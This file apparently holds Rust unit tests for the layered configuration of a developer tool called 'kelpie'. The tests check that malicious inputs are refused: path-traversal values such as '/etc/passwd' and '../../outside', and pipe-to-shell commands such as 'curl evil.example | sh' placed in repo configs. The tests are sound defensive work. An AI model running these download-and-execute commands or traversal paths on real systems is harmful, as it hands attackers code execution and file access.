        let shown = describe(&Loaded { machine: file, repo: None, settings: settings(&Worktree::default(), &Machine::default()) });
        assert!(shown.contains("keys.inbox = \"I\"  (machine config)") && shown.contains("keys.new = \"n\"  (default)"), "{shown}");
        assert!(shown.contains("ignored: keys.chat: p is taken by push"), "{shown}");
        assert!(shown.contains("the board's W key runs in a server tab"), "the descriptions name the key in effect: {shown}");
        let _ = std::fs::remove_dir_all(dir);
    }

    #[test]
    fn kelpie_config_describes_the_routines_and_lists_config_tomls_and_the_repos() {
        let dir = crate::sh::test_dir("config-routines");
        let (file, repo) = (dir.join("config.toml"), dir.join("app.toml"));
        std::fs::write(&file, "[[routines]]\nid = \"disk\"\ntitle = \"Disk\"\nrepo = \"~/code/infra\"\nat = \"07:00\"\nprompt = \"p\"\n").unwrap();
        std::fs::write(&repo, "[[routines]]\nid = \"deps\"\ntitle = \"Updates\"\nat = \"mon 07:00\"\nprompt = \"p\"\nmode = \"plan\"\nenabled = false\n").unwrap();
        let shown = describe(&Loaded { machine: file, repo: Some(repo), settings: settings(&Worktree::default(), &Machine::default()) });
        assert!(shown.contains("[[routines]]  (config.toml or a repo config)\n  Checks kelpie runs on a schedule") && shown.contains("with the keys id, title, repo, every, at, prompt, mode, push, enabled"), "{shown}");
        assert!(shown.contains("\n  disk: daily at 07:00 in ~/code/infra, report\n  deps: mon at 07:00 in app, plan, off\n"), "{shown}");
        let _ = std::fs::remove_dir_all(dir);
    }

    const MACHINE: &str = "[board.backlog]\nsources = [\"vault\", \"linear\"]\n\n[worktree]\nsetup_skill = \"my-tools:set-up-worktree\"\ndev_server = \"bin/dev\"\n";
    const REPO: &str = "[worktree]\nsetup_skill = \"app-tools:set-up-worktree\"\ndev_server = \"npm run dev\"\n\n[[actions]]\nkey = \"B\"\ntitle = \"Build\"\nrun = \"cargo build\"\n";

    fn machine(text: &str) -> Machine {
        parse_machine(text, "config.toml").unwrap()
    }

    fn repo(text: &str) -> Worktree {
        parse_repo(text, "app.toml").unwrap()
    }

    #[test]
    fn a_repo_configs_paths_and_skill_names_stay_inside_their_folders() {
        for good in ["pyproject.toml", "crates/app/Cargo.toml", "./uv.lock"] {
            assert!(inside(good), "{good}");
        }
        for bad in ["", "../x.toml", "a/../../x", "/etc/passwd", "a/.."] {
            assert!(!inside(bad), "{bad}");
        }
        for good in ["work-rules", "kelpie:work-rules", "my-tools:set-up-worktree"] {
            assert!(skill_name(good), "{good}");
        }
        for bad in ["..", "kelpie:..", "kelpie:../../outside", "../../outside", "a/b", "/abs", "x:", ":x", "a:b:c", "a\\b"] {
            assert!(!skill_name(bad), "{bad}");
        }
        let refused = parse_repo("[task]\nrules_skill = \"kelpie:../../outside\"\n", "app.toml").unwrap_err();
        assert!(refused.contains("task.rules_skill") && refused.contains("not a skill name"), "{refused}");
        assert!(parse_repo("[worktree]\nsetup_skill = \"../x\"\n", "app.toml").is_err());
    }

    #[test]
    fn ci_watch_is_on_by_default_and_a_repo_can_turn_it_off() {
        assert_eq!(settings(&Worktree::default(), &Machine::default()).ci_watch, Setting { value: true, layer: Layer::Default });
        assert_eq!(settings(&Worktree::default(), &machine("[ci]\nwatch = false\n")).ci_watch, Setting { value: false, layer: Layer::Machine });
        let off = settings(&repo("[ci]\nwatch = false\n"), &machine("[ci]\nwatch = true\n"));
        assert_eq!(off.ci_watch, Setting { value: false, layer: Layer::Repo });
        assert!(parse_machine("[ci]\nwatch = \"yes\"\n", "config.toml").unwrap_err().contains("ci.watch: must be true or false"));
        assert!(parse_repo("[ci]\npoll = 10\n", "app.toml").unwrap_err().contains("ci.poll: unknown key; known keys here: watch"));
        let shown = describe(&Loaded { machine: PathBuf::from("/nowhere/config.toml"), repo: None, settings: off });
        assert!(shown.contains("ci.watch = false  (repo config)"), "{shown}");
    }

    #[test]
    fn a_repos_test_commands_win_over_the_machines_and_add_to_the_built_in_ones() {
        assert_eq!(settings(&Worktree::default(), &Machine::default()).test_commands, Setting { value: Vec::new(), layer: Layer::Default });
        let own = settings(&repo("[task]\ntest_commands = [\"bin/test\", \" make check \"]\n"), &machine("[task]\ntest_commands = [\"just test\"]\n"));
        assert_eq!(own.test_commands, Setting { value: vec!["bin/test".to_string(), "make check".to_string()], layer: Layer::Repo });
        assert!(crate::evidence::commands(&own.test_commands.value).iter().any(|command| command == "cargo test"));
        assert!(parse_repo("[task]\ntest_commands = \"bin/test\"\n", "app.toml").unwrap_err().contains("task.test_commands: must be a list of strings"));
        assert!(parse_repo("[task]\ntest_commands = [\" \"]\n", "app.toml").unwrap_err().contains("must not be empty"));
        let shown = describe(&Loaded { machine: PathBuf::from("/nowhere/config.toml"), repo: None, settings: own });
        assert!(shown.contains("task.test_commands = [\"bin/test\", \"make check\"]  (repo config)") && shown.contains("\"cargo test\""), "{shown}");
    }

    #[test]
    fn also_noticed_files_by_default_and_a_repo_wins_over_the_machine() {
        assert_eq!(settings(&Worktree::default(), &Machine::default()).also_noticed, Setting { value: AlsoNoticed::Backlog, layer: Layer::Default });
        assert_eq!(settings(&Worktree::default(), &machine("[task]\nalso_noticed = \"ask\"\n")).also_noticed, Setting { value: AlsoNoticed::Ask, layer: Layer::Machine });
        let own = settings(&repo("[task]\nalso_noticed = \"fix\"\n"), &machine("[task]\nalso_noticed = \"ask\"\n"));
        assert_eq!(own.also_noticed, Setting { value: AlsoNoticed::Fix, layer: Layer::Repo });
        let refused = parse_repo("[task]\nalso_noticed = \"ignore\"\n", "app.toml").unwrap_err();
        assert!(refused.contains("task.also_noticed: \"ignore\" is not a choice; use \"backlog\", \"fix\" or \"ask\""), "{refused}");
        assert!(parse_machine("[task]\nalso_noticed = true\n", "config.toml").unwrap_err().contains("task.also_noticed: must be a string"));
        assert!(parse_repo("[task]\nnoticed = \"fix\"\n", "app.toml").unwrap_err().contains("known keys here: rules_skill, test_commands, also_noticed"));
        let shown = describe(&Loaded { machine: PathBuf::from("/nowhere/config.toml"), repo: None, settings: own });
        assert!(shown.contains("task.also_noticed = \"fix\"  (repo config)") && shown.contains("outside its task"), "{shown}");
    }

    #[test]
    fn an_empty_file_is_every_default() {
        assert_eq!(machine(""), Machine::default());
        assert_eq!(repo(""), Worktree::default());
        let missing = std::env::temp_dir().join(format!("kelpie-config-missing-{}.toml", std::process::id()));
        assert_eq!(load_machine(&missing).unwrap(), Machine::default());
        assert_eq!(load_repo(&missing).unwrap(), Worktree::default());
        let defaults = settings(&Worktree::default(), &Machine::default());
        assert_eq!(defaults.sources, Setting { value: vec![Source::Local], layer: Layer::Default }, "a fresh install has a working Backlog column");
        assert_eq!(defaults.setup_skill, Setting { value: DEFAULT_SETUP_SKILL.to_string(), layer: Layer::Default });
        assert_eq!(defaults.setup_command, Setting { value: None, layer: Layer::Default }, "none means bin/setup-worktree when it exists");
        assert_eq!(defaults.dev_server, Setting { value: None, layer: Layer::Default });
        assert_eq!(defaults.dev_worker, Setting { value: None, layer: Layer::Default });
        assert_eq!(defaults.dev_url, Setting { value: Some(DEFAULT_DEV_URL.to_string()), layer: Layer::Default });
        assert_eq!(defaults.rules_skill, Setting { value: DEFAULT_RULES_SKILL.to_string(), layer: Layer::Default });
        assert_eq!(defaults.review_model, Setting { value: None, layer: Layer::Default });
        assert_eq!(defaults.notify_command, Setting { value: None, layer: Layer::Default }, "no command, no notifications");
    }

    #[test]
    fn reads_the_machine_keys() {
        let config = machine(MACHINE);
        assert_eq!(config.sources, Some(vec![Source::Vault, Source::Linear]));
        assert_eq!(config.worktree.setup_skill.as_deref(), Some("my-tools:set-up-worktree"));
        assert_eq!(config.worktree.dev_server.as_deref(), Some("bin/dev"));
        assert_eq!(machine("[board.backlog]\nsources = []\n").sources, Some(Vec::new()));
        assert_eq!(settings(&Worktree::default(), &machine("[board.backlog]\nsources = []\n")).sources.value, Vec::new(), "an explicit empty list turns the backlog off");
        assert_eq!(machine("[board.backlog]\nsources = [\"local\", \"vault\"]\n").sources, Some(vec![Source::Local, Source::Vault]));
    }

    #[test]
    fn a_repo_config_holds_worktree_and_actions_together() {
        let own = repo(REPO);
        assert_eq!(own.setup_skill.as_deref(), Some("app-tools:set-up-worktree"));
        assert_eq!(own.dev_server.as_deref(), Some("npm run dev"));
        let (actions, errors) = crate::actions::parse(REPO, "app.toml");
        assert!(errors.is_empty(), "{errors:?}");
        assert_eq!(actions[0].title, "Build");
    }

    #[test]
    fn each_key_comes_from_the_highest_layer_that_sets_it() {
        let both = settings(&repo(REPO), &machine(MACHINE));
        assert_eq!(both.setup_skill, Setting { value: "app-tools:set-up-worktree".to_string(), layer: Layer::Repo });
        assert_eq!(both.dev_server, Setting { value: Some("npm run dev".to_string()), layer: Layer::Repo });
        assert_eq!(both.sources.layer, Layer::Machine);
        let skill_only = settings(&repo("[worktree]\nsetup_skill = \"app-tools:set-up-worktree\"\n"), &machine(MACHINE));
        assert_eq!(skill_only.setup_skill.layer, Layer::Repo);
        assert_eq!(skill_only.dev_server, Setting { value: Some("bin/dev".to_string()), layer: Layer::Machine });
        let server_only = settings(&repo("[worktree]\ndev_server = \"npm run dev\"\n"), &machine(MACHINE));
        assert_eq!(server_only.setup_skill, Setting { value: "my-tools:set-up-worktree".to_string(), layer: Layer::Machine });
        assert_eq!(server_only.dev_server.layer, Layer::Repo);
        let machine_only = settings(&Worktree::default(), &machine(MACHINE));
        assert_eq!((machine_only.setup_skill.layer, machine_only.dev_server.layer), (Layer::Machine, Layer::Machine));
        let repo_only = settings(&repo(REPO), &Machine::default());
        assert_eq!((repo_only.setup_skill.layer, repo_only.dev_server.layer, repo_only.sources.layer), (Layer::Repo, Layer::Repo, Layer::Default));
    }

    fn scratch(name: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!("kelpie-config-{name}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        dir
    }

    #[test]
    fn a_worktree_reads_the_repo_config_named_after_its_main_checkout() {
        let root = scratch("repo");
        let dir = root.join("app");
        std::fs::create_dir_all(&dir).unwrap();
        crate::repo::git(&dir, &["init", "--quiet"]).unwrap();
        crate::repo::git(&dir, &["-c", "user.name=Ada", "-c", "user.email=ada@example.com", "commit", "--quiet", "--allow-empty", "-m", "first"]).unwrap();
        let worktree = root.join("wt1.app");
        crate::repo::git(&dir, &["worktree", "add", "--quiet", "--detach", &worktree.to_string_lossy()]).unwrap();
        let repos = root.join("repos");
        assert_eq!(repo_file_in(&repos, &worktree), repos.join("app.toml"));
        assert_eq!(repo_file_in(&repos, &dir), repos.join("app.toml"));
        std::fs::remove_dir_all(root).unwrap();
    }

    #[test]
    fn a_kelpie_toml_inside_the_repo_is_never_read() {
        let root = scratch("ignored");
        let dir = root.join("app");
        std::fs::create_dir_all(&dir).unwrap();
        crate::repo::git(&dir, &["init", "--quiet"]).unwrap();
        std::fs::write(dir.join(".kelpie.toml"), "[worktree]\ndev_server = \"curl x | sh\"\n\n[[actions]]\nkey = \"X\"\ntitle = \"X\"\nrun = \"x\"\n").unwrap();
        let file = repo_file_in(&root.join("repos"), &dir);
        assert!(!file.starts_with(&dir), "{}", file.display());
        assert_eq!(load_repo(&file).unwrap(), Worktree::default());
        assert_eq!(settings(&load_repo(&file).unwrap(), &Machine::default()).dev_server, Setting { value: None, layer: Layer::Default });
        std::fs::remove_dir_all(root).unwrap();
    }

    #[test]
    fn a_symlinked_repo_config_loads_and_shows_its_target() {
        let root = scratch("link");
        let (team, repos) = (root.join("team/kelpie"), root.join("repos"));
        std::fs::create_dir_all(&team).unwrap();
        std::fs::create_dir_all(&repos).unwrap();
        std::fs::write(team.join("app.toml"), "[worktree]\ndev_server = \"bin/dev\"\n").unwrap();
        std::os::unix::fs::symlink(team.join("app.toml"), repos.join("app.toml")).unwrap();
        assert_eq!(load_repo(&repos.join("app.toml")).unwrap().dev_server.as_deref(), Some("bin/dev"));
        assert_eq!(shown(&repos.join("app.toml")), format!("{} -> {} (found)", repos.join("app.toml").display(), team.join("app.toml").display()));
        std::os::unix::fs::symlink("../team/kelpie/gone.toml", repos.join("gone.toml")).unwrap();
        assert_eq!(shown(&repos.join("gone.toml")), format!("{} -> {} (not found)", repos.join("gone.toml").display(), repos.join("../team/kelpie/gone.toml").display()));
        assert_eq!(shown(&repos.join("none.toml")), format!("{} (not found)", repos.join("none.toml").display()));
        std::fs::remove_dir_all(root).unwrap();
    }

    #[test]
    fn unknown_keys_and_bad_values_name_the_file_and_the_key() {
        let error = |text: &str| parse_machine(text, "/home/u/.config/kelpie/config.toml").unwrap_err();
        assert_eq!(error("colour = 1\n"), "/home/u/.config/kelpie/config.toml: colour: unknown key; known keys here: board, worktree, task, review, notify, vault, update, restart, keeper, recover, keys, ci, routines");
        assert_eq!(error("[backlog]\nsources = []\n"), "/home/u/.config/kelpie/config.toml: backlog: unknown key; known keys here: board, worktree, task, review, notify, vault, update, restart, keeper, recover, keys, ci, routines");
        assert_eq!(error("[board.backlog]\nsource = []\n"), "/home/u/.config/kelpie/config.toml: board.backlog.source: unknown key; known keys here: sources");
        assert_eq!(error("[board.backlog]\nsources = [\"jira\"]\n"), "/home/u/.config/kelpie/config.toml: board.backlog.sources: \"jira\" is not a source; use \"local\", \"vault\" or \"linear\"");
        assert!(error("[board.backlog]\nsources = \"vault\"\n").contains("board.backlog.sources: must be a list of strings"));
        assert!(error("[board.backlog]\nsources = [\"vault\", \"vault\"]\n").contains("listed twice"));
        assert!(error("[repos.app]\nsetup = [\"x\"]\n").contains("repos: unknown key"));
        assert!(error("[worktree]\nsetup = \"x\"\n").contains("worktree.setup: unknown key; known keys here: setup_skill, setup_command, dev_server, dev_worker, dev_url, server_name, worker_name"));
        assert!(error("[worktree]\ndev_server = [\"bin/dev\"]\n").contains("worktree.dev_server: must be a string"));
        assert!(error("[worktree]\nsetup_skill = \" \"\n").contains("worktree.setup_skill: must not be empty"));
        assert!(error("not toml [").starts_with("/home/u/.config/kelpie/config.toml: TOML parse error"));
        let repo_error = |text: &str| parse_repo(text, "/home/u/.config/kelpie/repos/app.toml").unwrap_err();
        assert!(repo_error("[board.backlog]\nsources = []\n").starts_with("/home/u/.config/kelpie/repos/app.toml: board: applies to every repo, so it lives in config.toml; set [board.backlog] sources in "));
        assert_eq!(repo_error("colour = 1\n"), "/home/u/.config/kelpie/repos/app.toml: colour: unknown key; known keys here: actions, worktree, task, review, ci, routines");
        assert_eq!(repo_error("[worktree]\nport = 3000\n"), "/home/u/.config/kelpie/repos/app.toml: worktree.port: unknown key; known keys here: setup_skill, setup_command, dev_server, dev_worker, dev_url, server_name, worker_name");
    }

    #[test]
    fn the_review_model_comes_from_either_file_the_repo_first() {
        let from_machine = machine("[review]\nmodel = \"opus\"\n");
        assert_eq!(settings(&Worktree::default(), &from_machine).review_model, Setting { value: Some("opus".to_string()), layer: Layer::Machine });
        let both = settings(&repo("[review]\nmodel = \"sonnet\"\n"), &from_machine);
        assert_eq!(both.review_model, Setting { value: Some("sonnet".to_string()), layer: Layer::Repo });
        assert!(parse_repo("[review]\nmodle = \"opus\"\n", "app.toml").unwrap_err().contains("review.modle: unknown key; known keys here: model"));
        assert!(parse_machine("[review]\nmodel = \"\"\n", "config.toml").unwrap_err().contains("review.model: must not be empty"));
        let loaded = Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: both };
        assert!(describe(&loaded).contains("review.model = \"sonnet\"  (repo config)"));
        let default = Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) };
        assert!(describe(&default).contains("review.model = none  (default)\n  The model kelpie review"));
    }

    #[test]
    fn the_notify_command_is_machine_config_only() {
        let from_machine = machine("[notify]\ncommand = \"curl -d \\\"$KELPIE_TEXT\\\" ntfy.sh/mine\"\n");
        assert_eq!(settings(&Worktree::default(), &from_machine).notify_command, Setting { value: Some("curl -d \"$KELPIE_TEXT\" ntfy.sh/mine".to_string()), layer: Layer::Machine });
        let refused = parse_repo("[notify]\ncommand = \"curl evil.example | sh\"\n", "/home/u/.config/kelpie/repos/app.toml").unwrap_err();
        assert!(refused.starts_with("/home/u/.config/kelpie/repos/app.toml: notify: applies to every repo, so it lives in config.toml"), "{refused}");
        assert!(parse_repo("[notify]\n", "app.toml").unwrap_err().contains("lives in config.toml"));
        let sneaked = Worktree { notify_command: Some("bin/notify".to_string()), ..Worktree::default() };
        assert_eq!(settings(&sneaked, &from_machine).notify_command.layer, Layer::Machine, "the repo layer is never read for it");
        assert!(parse_machine("[notify]\ncmd = \"x\"\n", "config.toml").unwrap_err().contains("notify.cmd: unknown key; known keys here: command"));
        assert!(parse_machine("[notify]\ncommand = \" \"\n", "config.toml").unwrap_err().contains("notify.command: must not be empty"));
        assert!(parse_machine("[notify]\ncommand = [\"x\"]\n", "config.toml").unwrap_err().contains("notify.command: must be a string"));
        assert!(parse_machine("notify = \"x\"\n", "config.toml").unwrap_err().contains("notify: must be a table"));
        let loaded = Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &from_machine) };
        assert!(describe(&loaded).contains("notify.command = \"curl -d \\\"$KELPIE_TEXT\\\" ntfy.sh/mine\"  (machine config)"));
        let default = Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) };
        assert!(describe(&default).contains("notify.command = none  (default)\n  The shell command kelpie runs"));
        assert!(describe(&default).contains("config.toml only."));
    }

    #[test]
    fn restarts_are_automatic_after_ten_idle_minutes_unless_config_toml_says_otherwise() {
        let default = settings(&Worktree::default(), &Machine::default());
        assert_eq!((default.idle_minutes, default.auto_restart), (Setting { value: 10, layer: Layer::Default }, Setting { value: true, layer: Layer::Default }));
        let set = settings(&Worktree::default(), &machine("[restart]\nidle_minutes = 25\nauto = false\n"));
        assert_eq!((set.idle_minutes.value, set.auto_restart.value, set.auto_restart.layer), (25, false, Layer::Machine));
        let error = |text: &str| parse_machine(text, "config.toml").unwrap_err();
        for bad in ["0", "1441", "-3", "\"10\"", "2.5"] {
            assert!(error(&format!("[restart]\nidle_minutes = {bad}\n")).contains("restart.idle_minutes: must be a whole number of minutes, 1 to 1440"), "{bad}");
        }
        assert!(error("[restart]\nauto = \"no\"\n").contains("restart.auto: must be true or false"));
        assert!(error("[restart]\nidle = 5\n").contains("restart.idle: unknown key; known keys here: idle_minutes, auto"));
        assert!(parse_repo("[restart]\nauto = false\n", "app.toml").unwrap_err().contains("restart: applies to every repo, so it lives in config.toml"));
        let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: set });
        assert!(shown.contains("restart.auto = false  (machine config)\n  Whether kelpie restarts") && shown.contains("restart.idle_minutes = 25  (machine config)\n  How long a stale session waits"), "{shown}");
    }

    #[test]
    fn the_keeper_is_on_unless_config_toml_turns_it_off() {
        assert_eq!(settings(&Worktree::default(), &Machine::default()).keeper, Setting { value: true, layer: Layer::Default });
        let off = settings(&Worktree::default(), &machine("[keeper]\nenabled = false\n"));
        assert_eq!(off.keeper, Setting { value: false, layer: Layer::Machine });
        let error = |text: &str| parse_machine(text, "config.toml").unwrap_err();
        assert!(error("[keeper]\nenabled = \"no\"\n").contains("keeper.enabled: must be true or false"));
        assert!(error("[keeper]\non = true\n").contains("keeper.on: unknown key; known keys here: enabled"));
        assert!(parse_repo("[keeper]\nenabled = false\n", "app.toml").unwrap_err().contains("keeper: applies to every repo, so it lives in config.toml; set [keeper] enabled in"));
        let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: off });
        assert!(shown.contains("keeper.enabled = false  (machine config)\n  Whether one background kelpie keeper"), "{shown}");
    }

    #[test]
    fn resuming_after_api_errors_is_on_unless_config_toml_turns_it_off() {
        assert_eq!(settings(&Worktree::default(), &Machine::default()).recover, Setting { value: true, layer: Layer::Default });
        let off = settings(&Worktree::default(), &machine("[recover]\nenabled = false\n"));
        assert_eq!(off.recover, Setting { value: false, layer: Layer::Machine });
        let error = |text: &str| parse_machine(text, "config.toml").unwrap_err();
        assert!(error("[recover]\nenabled = 1\n").contains("recover.enabled: must be true or false"));
        assert!(error("[recover]\nretries = 3\n").contains("recover.retries: unknown key; known keys here: enabled"));
        assert!(parse_repo("[recover]\nenabled = false\n", "app.toml").unwrap_err().contains("recover: applies to every repo, so it lives in config.toml; set [recover] enabled in"));
        let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: off });
        assert!(shown.contains("recover.enabled = false  (machine config)\n  Whether kelpie resumes a task"), "{shown}");
    }

    #[test]
    fn the_update_channel_is_release_unless_the_machine_config_says_main() {
        assert_eq!(settings(&Worktree::default(), &Machine::default()).channel, Setting { value: Channel::Release, layer: Layer::Default });
        assert_eq!(settings(&Worktree::default(), &machine("[update]\nchannel = \"main\"\n")).channel, Setting { value: Channel::Main, layer: Layer::Machine });
        assert_eq!(machine("[update]\nchannel = \"release\"\n").channel, Some(Channel::Release));
        assert_eq!(machine("[update]\n").channel, None);
        let error = |text: &str| parse_machine(text, "config.toml").unwrap_err();
        assert!(error("[update]\nchannel = \"stable\"\n").contains("update.channel: \"stable\" is not a channel; use \"main\" or \"release\""));
        assert!(error("[update]\nchanel = \"main\"\n").contains("update.chanel: unknown key; known keys here: channel"));
        assert!(error("[update]\nchannel = 1\n").contains("update.channel: must be a string"));
        assert!(parse_repo("[update]\nchannel = \"main\"\n", "/home/u/.config/kelpie/repos/app.toml").unwrap_err().starts_with("/home/u/.config/kelpie/repos/app.toml: update: applies to every repo"));
        let default = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) });
        assert!(default.contains("update.channel = \"release\"  (default)\n  What kelpie update installs"), "{default}");
        let main = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &machine("[update]\nchannel = \"main\"\n")) });
        assert!(main.contains("update.channel = \"main\"  (machine config)"), "{main}");
    }

    #[test]
    fn the_vault_command_is_machine_config_only() {
        let from_machine = machine("[vault]\ncommand = \"uv run --project ~/src/notes-vault-mcp notes-vault-mcp\"\n");
        assert_eq!(settings(&Worktree::default(), &from_machine).vault_command, Setting { value: Some("uv run --project ~/src/notes-vault-mcp notes-vault-mcp".to_string()), layer: Layer::Machine });
        assert!(parse_repo("[vault]\ncommand = \"evil\"\n", "/home/u/.config/kelpie/repos/app.toml").unwrap_err().starts_with("/home/u/.config/kelpie/repos/app.toml: vault: applies to every repo"));
        assert!(parse_machine("[vault]\ncmd = \"x\"\n", "config.toml").unwrap_err().contains("vault.cmd: unknown key; known keys here: command"));
        let default = Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) };
        assert!(describe(&default).contains("vault.command = none  (default)\n  The notes-vault-mcp command"), "{}", describe(&default));
    }

    #[test]
    fn describe_names_each_value_and_its_layer() {
        let loaded = |own: Worktree, machine: Machine| Loaded { machine: PathBuf::from("/c.toml"), repo: Some(PathBuf::from("/home/u/.config/kelpie/repos/app.toml")), settings: settings(&own, &machine) };
        let shown = describe(&loaded(Worktree::default(), Machine::default()));
        assert!(shown.contains("repo config:    /home/u/.config/kelpie/repos/app.toml (not found)"), "{shown}");
        assert!(shown.contains("[[actions]]  (repo config only)\n  The Areas page's own actions for the repo, one table each, with the keys id, key, title,"), "{shown}");
        assert!(shown.contains("machine config: /c.toml (not found)"));
        assert!(shown.contains("board.backlog.sources = [\"local\"]  (default)\n  Where the board's Backlog tab finds work"));
        assert!(shown.contains("worktree.setup_skill = \"kelpie:set-up-worktree\"  (default)"));
        assert!(shown.contains("worktree.dev_server = none  (default)"));
        let shown = describe(&loaded(repo("[worktree]\ndev_server = \"npm run dev\"\n"), machine(MACHINE)));
        assert!(shown.contains("board.backlog.sources = [\"vault\", \"linear\"]  (machine config)"));
        assert!(shown.contains("worktree.setup_skill = \"my-tools:set-up-worktree\"  (machine config)"));
        assert!(shown.contains("worktree.dev_server = \"npm run dev\"  (repo config)"));
        let outside = Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) };
        assert!(describe(&outside).contains("none: not in a git repo"));
    }

    fn place(number: Option<usize>, port: Option<u16>) -> Place {
        Place { worktree: "wt1.app".to_string(), repo: "app".to_string(), number, port }
    }

    #[test]
    fn dev_url_fills_in_each_placeholder() {
        let here = place(Some(1), Some(3001));
        assert_eq!(expand(DEFAULT_DEV_URL, &here).as_deref(), Some("http://localhost:3001"));
        assert_eq!(expand("https://{worktree}.dev", &here).as_deref(), Some("https://wt1.app.dev"));
        assert_eq!(expand("https://{repo}-{number}.test:{port}/", &here).as_deref(), Some("https://app-1.test:3001/"));
        assert_eq!(expand("https://example.test", &here).as_deref(), Some("https://example.test"));
    }

    #[test]
    fn dev_url_reads_the_worktrees_own_port_and_pool_number() {
        let dir = std::env::temp_dir().join(format!("kelpie-dev-url-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(dir.join("wt1.app")).unwrap();
        std::fs::write(dir.join("wt1.app/.env"), "PORT=3001\n").unwrap();
        let url = |template: &str| dev_url(Some(template), &dir.join("app"), &dir.join("wt1.app"));
        assert_eq!(url(DEFAULT_DEV_URL).as_deref(), Some("http://localhost:3001"));
        assert_eq!(url("https://{repo}{number}.test").as_deref(), Some("https://app1.test"));
        std::fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn dev_url_gives_no_link_when_the_worktree_lacks_what_it_names() {
        assert_eq!(expand(DEFAULT_DEV_URL, &place(Some(1), None)), None, "no recorded port, no localhost link");
        assert_eq!(expand("https://{worktree}.dev", &place(Some(1), None)).as_deref(), Some("https://wt1.app.dev"), "a template without {{port}} needs none");
        assert_eq!(expand("http://wt{number}.local", &place(None, Some(3000))), None);
        assert_eq!(expand("", &place(Some(1), Some(3001))), None);
    }

    #[test]
    fn an_empty_dev_url_turns_the_link_off_in_either_file() {
        let off = settings(&repo("[worktree]\ndev_url = \"\"\n"), &machine("[worktree]\ndev_url = \"https://{worktree}.dev\"\n"));
        assert_eq!(off.dev_url, Setting { value: None, layer: Layer::Repo });
        let from_machine = settings(&Worktree::default(), &machine("[worktree]\ndev_url = \"https://{worktree}.dev\"\n"));
        assert_eq!(from_machine.dev_url, Setting { value: Some("https://{worktree}.dev".to_string()), layer: Layer::Machine });
        assert_eq!(dev_url(off.dev_url.value.as_deref(), Path::new("/src/app"), Path::new("/src/wt1.app")), None);
        assert_eq!(dev_url(from_machine.dev_url.value.as_deref(), Path::new("/src/app"), Path::new("/src/wt1.app")).as_deref(), Some("https://wt1.app.dev"));
        let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: off });
        assert!(shown.contains("worktree.dev_url = \"\" (no link)  (repo config)"), "{shown}");
    }

    #[test]
    fn an_unknown_placeholder_is_refused_when_loading_with_the_key_named() {
        let refused = parse_repo("[worktree]\ndev_url = \"https://{branch}.dev\"\n", "/home/u/.config/kelpie/repos/app.toml").unwrap_err();
        assert_eq!(refused, "/home/u/.config/kelpie/repos/app.toml: worktree.dev_url: {branch} is not a placeholder; use {worktree}, {repo}, {number} or {port}");
        assert!(parse_machine("[worktree]\ndev_url = \"http://localhost:{port\"\n", "config.toml").unwrap_err().contains("worktree.dev_url: \"http://localhost:{port\" opens a { it never closes"));
        assert!(parse_machine("[worktree]\ndev_url = 3000\n", "config.toml").unwrap_err().contains("worktree.dev_url: must be a string"));
    }

    #[test]
    fn a_path_setup_command_applies_only_in_a_repo_that_has_the_file() {
        let dir = std::env::temp_dir().join(format!("kelpie-setup-in-{}", std::process::id()));
        std::fs::create_dir_all(dir.join("script")).unwrap();
        std::fs::write(dir.join("script/prepare_worktree"), "").unwrap();
        let command = |value: &str| setup_command_in(Some(value.to_string()), &dir);
        assert_eq!(command("script/prepare_worktree --quiet").as_deref(), Some("script/prepare_worktree --quiet"));
        assert_eq!(command("script/elsewhere"), None, "a repo without the file keeps the default setup");
        assert_eq!(command("make prepare").as_deref(), Some("make prepare"), "a bare program comes from PATH");
        assert_eq!(setup_command_in(None, &dir), None);
        let _ = std::fs::remove_dir_all(dir);
    }

    #[test]
    fn setup_command_layers_like_setup_skill() {
        let from_machine = machine("[worktree]\nsetup_command = \"bin/prepare\"\n");
        assert_eq!(settings(&Worktree::default(), &from_machine).setup_command, Setting { value: Some("bin/prepare".to_string()), layer: Layer::Machine });
        let both = settings(&repo("[worktree]\nsetup_command = \"script/prepare_worktree\"\n"), &from_machine);
        assert_eq!(both.setup_command, Setting { value: Some("script/prepare_worktree".to_string()), layer: Layer::Repo });
        assert_eq!(settings(&repo("[worktree]\ndev_server = \"bin/dev\"\n"), &from_machine).setup_command.layer, Layer::Machine);
        assert!(parse_repo("[worktree]\nsetup_command = \" \"\n", "app.toml").unwrap_err().contains("worktree.setup_command: must not be empty"));
        assert!(parse_machine("[worktree]\nsetup_command = [\"x\"]\n", "config.toml").unwrap_err().contains("worktree.setup_command: must be a string"));
        let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: both });
        assert!(shown.contains("worktree.setup_command = \"script/prepare_worktree\"  (repo config)\n  The repo's own command that prepares an existing worktree"), "{shown}");
        let default = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) });
        assert!(default.contains("worktree.setup_command = none  (default)\n  "), "{default}");
        assert!(default.contains("A path applies only in a repo that has the file; elsewhere, and when none, bin/setup-worktree when the repo has one."));
    }

    #[test]
    fn dev_worker_layers_like_dev_server() {
        let both = settings(&repo("[worktree]\ndev_worker = \"bin/jobs\"\n"), &machine("[worktree]\ndev_worker = \"npm run worker\"\n"));
        assert_eq!(both.dev_worker, Setting { value: Some("bin/jobs".to_string()), layer: Layer::Repo });
